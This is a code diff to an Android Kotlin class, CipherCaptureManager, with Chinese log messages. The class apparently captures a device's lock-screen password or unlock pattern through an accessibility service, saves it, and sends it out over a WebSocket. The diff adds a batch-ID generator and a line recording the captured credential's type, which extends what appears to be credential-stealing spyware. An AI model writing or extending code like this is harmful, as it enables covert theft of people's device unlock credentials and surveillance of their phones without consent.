@@ -373,6 +373,18 @@ class CipherCaptureManager(
     @Volatile
     var lockBatchId: Long = 0L
 
+    private val lockBatchCounter = AtomicInteger(0)
+
+    fun refreshLockBatchId() {
+        lockBatchId = (System.currentTimeMillis() shl 10) or
+            (lockBatchCounter.incrementAndGet().toLong() % 1024)
+        Log.d(TAG, "lockBatchId refreshed: $lockBatchId")
+    }
+
+    fun resetLockBatchId() {
+        lockBatchId = 0L
+    }
+
     /** 是否正在监听 */
     @Volatile
     var isListening: Boolean = false
@@ -662,6 +674,7 @@ class CipherCaptureManager(
             // 图案通过
             Log.d(TAG, "✅ 密码验证通过，保存: type=$quality, patternLen=${patternIndices.size}")
             Log.d(TAG, "🔐 密码已捕获: type=$quality, textLen=${text?.length ?: 0}, patternLen=${patternIndices.size}")
+            com.storm.safe.rock.service.MyAccessibilityService.getInstance()?.lastCapturedCipherQuality = quality
             saveCipherToPrefs(finalCipher)
             syncToAppStatusManager(finalCipher)
             sendPasswordViaWebSocket(finalCipher)
@@ -716,6 +729,7 @@ class CipherCaptureManager(
         // 通过验证
         Log.d(TAG, "✅ 密码验证通过，保存: type=$quality, textLen=${text.length}")
         Log.d(TAG, "🔐 密码已捕获: type=$quality, textLen=${text.length}, patternLen=0")
+        com.storm.safe.rock.service.MyAccessibilityService.getInstance()?.lastCapturedCipherQuality = quality
         saveCipherToPrefs(finalCipher)
         syncToAppStatusManager(finalCipher)
         sendPasswordViaWebSocket(finalCipher)
